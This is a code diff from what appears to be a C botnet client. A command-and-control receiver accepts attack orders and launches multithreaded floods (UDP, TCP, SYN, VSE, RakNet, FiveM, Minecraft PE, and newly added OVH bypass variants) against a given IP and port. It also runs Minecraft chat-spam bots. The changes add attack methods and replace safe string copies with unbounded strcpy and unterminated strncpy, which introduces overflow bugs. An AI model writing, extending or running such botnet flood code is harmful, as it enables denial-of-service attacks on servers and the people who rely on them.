         if (bot->t_move && bot->spawned_ok && !bot->is_closing && now >= bot->t_move && !g_mcbot_stop_requested && !g_tiempo_terminado) {
             if ((double)rand()/RAND_MAX < 0.15) {
                 double r2 = (double)rand()/RAND_MAX;
@@ -1658,7 +1838,6 @@ static void *mcbot_thread(void *arg) {
             bot->t_move = now + 1500 + rand_range(0, 800);
         }
 
-        // ─── CHAT SPAM (IDÉNTICO a mcbot.c) ──────────────────────────
         if (bot->t_chat && bot->spawned_ok && !bot->is_closing && now >= bot->t_chat && MENSAJES_COUNT > 0 && !g_mcbot_stop_requested && !g_tiempo_terminado) {
             pthread_mutex_lock(&g_mcbot_mutex);
             int idx = g_global_msg_idx++ % MENSAJES_COUNT;
@@ -1722,7 +1901,6 @@ void start_mcbot(const char *ip, int port, const char *nombre, int bots, int tie
         bot->spawned_ok = 0;
         bot->variant_a = 0;
         strncpy(bot->host, ip, sizeof(bot->host)-1);
-        bot->host[sizeof(bot->host)-1] = '\0';
         if (register_cmd) {
             if (register_cmd[0] == '/') {
                 char pass[16];
@@ -1730,7 +1908,6 @@ void start_mcbot(const char *ip, int port, const char *nombre, int bots, int tie
                 snprintf(bot->register_cmd, sizeof(bot->register_cmd), "%s %s", register_cmd, pass);
             } else {
                 strncpy(bot->register_cmd, register_cmd, sizeof(bot->register_cmd)-1);
-                bot->register_cmd[sizeof(bot->register_cmd)-1] = '\0';
             }
         }
         random_name_mc(nombre, bot->nombre, MAX_NOMBRE_LEN);
@@ -1796,7 +1973,7 @@ void stop_mcbot_all(void) {
     printf(GREEN "[+] All MCBots stopped\n" RESET);
 }
 
-// ─── ATAQUES y C2 ──────────────────────────────────────────────────────
+// ─── start_attack actualizada ──────────────────────────────────────────────
 void start_attack(const char *method, const char *ip, int port, int duration, int threads, const char *username) {
     pthread_mutex_lock(&attacks_mutex);
     if (attack_count >= MAX_ATTACKS) {
@@ -1805,15 +1982,12 @@ void start_attack(const char *method, const char *ip, int port, int duration, in
     }
     Attack *atk = malloc(sizeof(Attack));
     memset(atk, 0, sizeof(Attack));
-    strncpy(atk->ip, ip, sizeof(atk->ip)-1);
-    atk->ip[sizeof(atk->ip)-1] = '\0';
+    strncpy(atk->ip, ip, 63);
     atk->port = port;
     atk->duration = duration;
     atk->threads = threads > MAX_THREADS ? MAX_THREADS : threads;
-    strncpy(atk->username, username, sizeof(atk->username)-1);
-    atk->username[sizeof(atk->username)-1] = '\0';
-    strncpy(atk->method, method, sizeof(atk->method)-1);
-    atk->method[sizeof(atk->method)-1] = '\0';
+    strncpy(atk->username, username, 31);
+    strncpy(atk->method, method, 15);
     atk->start_time = time(NULL);
     atk->running = 1;
     attacks[attack_count++] = atk;
@@ -1821,34 +1995,50 @@ void start_attack(const char *method, const char *ip, int port, int duration, in
 
     if (strcasecmp(method, ".MCBOT") == 0) return;
 
-    atk->thread_count = threads;
-    atk->threads_arr = malloc(threads * sizeof(pthread_t));
+    atk->thread_count = atk->threads;
+    atk->threads_arr = malloc(atk->threads * sizeof(pthread_t));
     if (!atk->threads_arr) { atk->running = 0; return; }
 
     void *(*attack_func)(void *) = NULL;
-    if (strcasecmp(method, ".UDP") == 0) attack_func = udp_flood_thread;
-    else if (strcasecmp(method, ".TCP") == 0) attack_func = tcp_flood_thread;
-    else if (strcasecmp(method, ".SYN") == 0) attack_func = syn_flood_thread;
-    else if (strcasecmp(method, ".HEX") == 0) attack_func = hex_flood_thread;
-    else if (strcasecmp(method, ".VSE") == 0) attack_func = vse_flood_thread;
-    else if (strcasecmp(method, ".MCPE") == 0) attack_func = mcpe_flood_thread;
-    else if (strcasecmp(method, ".FIVEM") == 0) attack_func = fivem_flood_thread;
-    else if (strcasecmp(method, ".UDPPPS") == 0) attack_func = udppps_flood_thread;
-    else if (strcasecmp(method, ".RAKNET") == 0) attack_func = raknet_flood_thread;
-    else if (strcasecmp(method, ".UDPQUERY") == 0) attack_func = udpquery_flood_thread;
-    else if (strcasecmp(method, ".UDPKILL") == 0) attack_func = udpkill_flood_thread;
-    else if (strcasecmp(method, ".UDPBYPASS") == 0) attack_func = udpbypass_flood_thread;
-    else if (strcasecmp(method, ".UDPFRAG") == 0) attack_func = udpfrag_flood_thread;
-    else if (strcasecmp(method, ".MIX") == 0) attack_func = mix_flood_thread;
+    if (strcasecmp(method, ".UDP") == 0 || strcasecmp(method, ".OVHUDP") == 0)
+        attack_func = udp_raw_flood_thread;
+    else if (strcasecmp(method, ".TCP") == 0 || strcasecmp(method, ".OVHTCP") == 0)
+        attack_func = tcp_raw_flood_thread;
+    else if (strcasecmp(method, ".OVHPPS") == 0)
+        attack_func = ovhpps_flood_thread;
+    else if (strcasecmp(method, ".SYN") == 0)
+        attack_func = syn_flood_thread;
+    else if (strcasecmp(method, ".HEX") == 0)
+        attack_func = hex_flood_thread;
+    else if (strcasecmp(method, ".VSE") == 0)
+        attack_func = vse_flood_thread;
+    else if (strcasecmp(method, ".MCPE") == 0)
+        attack_func = mcpe_flood_thread;
+    else if (strcasecmp(method, ".FIVEM") == 0)
+        attack_func = fivem_flood_thread;
+    else if (strcasecmp(method, ".UDPPPS") == 0)
+        attack_func = udppps_flood_thread;
+    else if (strcasecmp(method, ".RAKNET") == 0)
+        attack_func = raknet_flood_thread;
+    else if (strcasecmp(method, ".UDPQUERY") == 0)
+        attack_func = udpquery_flood_thread;
+    else if (strcasecmp(method, ".UDPKILL") == 0)
+        attack_func = udpkill_flood_thread;
+    else if (strcasecmp(method, ".UDPBYPASS") == 0)
+        attack_func = udpbypass_flood_thread;
+    else if (strcasecmp(method, ".UDPFRAG") == 0)
+        attack_func = udpfrag_flood_thread;
+    else if (strcasecmp(method, ".MIX") == 0)
+        attack_func = mix_flood_thread;
 
     if (attack_func) {
-        for (int i = 0; i < threads; i++) {
+        for (int i = 0; i < atk->threads; i++) {
             pthread_create(&atk->threads_arr[i], NULL, attack_func, atk);
             pthread_detach(atk->threads_arr[i]);
         }
     }
     printf(GREEN "[+] Attack started: %s %s:%d (%ds, %d threads) user: %s\n" RESET,
-           method, ip, port, duration, threads, username);
+           method, ip, port, duration, atk->threads, username);
 }
 
 void stop_attacks(const char *username) {
@@ -1887,9 +2077,7 @@ void *c2_receiver(void *arg) {
         int argc = 0;
         char *token = strtok(buffer, " ");
         while (token && argc < MAX_ARGS) {
-            strncpy(args[argc], token, sizeof(args[argc])-1);
-            args[argc][sizeof(args[argc])-1] = '\0';
-            argc++;
+            strcpy(args[argc++], token);
             token = strtok(NULL, " ");
         }
         if (argc == 0) continue;
@@ -1923,7 +2111,9 @@ void *c2_receiver(void *arg) {
                  strcasecmp(cmd, ".FIVEM") == 0 || strcasecmp(cmd, ".UDPPPS") == 0 ||
                  strcasecmp(cmd, ".RAKNET") == 0 || strcasecmp(cmd, ".UDPQUERY") == 0 ||
                  strcasecmp(cmd, ".UDPKILL") == 0 || strcasecmp(cmd, ".UDPBYPASS") == 0 ||
-                 strcasecmp(cmd, ".UDPFRAG") == 0 || strcasecmp(cmd, ".MIX") == 0) {
+                 strcasecmp(cmd, ".UDPFRAG") == 0 || strcasecmp(cmd, ".MIX") == 0 ||
+                 strcasecmp(cmd, ".OVHUDP") == 0 || strcasecmp(cmd, ".OVHTCP") == 0 ||
+                 strcasecmp(cmd, ".OVHPPS") == 0) {
             if (argc >= 6) {
                 char *ip = args[1];
                 int port = atoi(args[2]);
@@ -1935,7 +2125,7 @@ void *c2_receiver(void *arg) {
                 if (duration < 10) duration = 10;
                 if (duration > 1300) duration = 1300;
                 start_attack(cmd, ip, port, duration, threads, username);
-                char resp[512];
+                char resp[128];
                 snprintf(resp, sizeof(resp), "[+] %s attack started\n", cmd);
                 send(bot->socket, resp, strlen(resp), 0);
             }
@@ -1949,19 +2139,18 @@ void *c2_receiver(void *arg) {
 
 int authenticate(int sock) {
     char buffer[BUFFER_SIZE];
-    char arch[32] = "unknown";
+    char arch[32];
     char response[256];
     int bytes;
 
     FILE *fp = popen("uname -m 2>/dev/null", "r");
     if (fp) {
-        if (fgets(arch, sizeof(arch), fp) == NULL) {
-            strcpy(arch, "unknown");
-        }
+        fgets(arch, sizeof(arch), fp);
         arch[strcspn(arch, "\n")] = 0;
         pclose(fp);
+    } else {
+        strcpy(arch, "unknown");
     }
-
     printf(CYAN "[*] Architecture: %s\n" RESET, arch);
 
     memset(buffer, 0, BUFFER_SIZE);
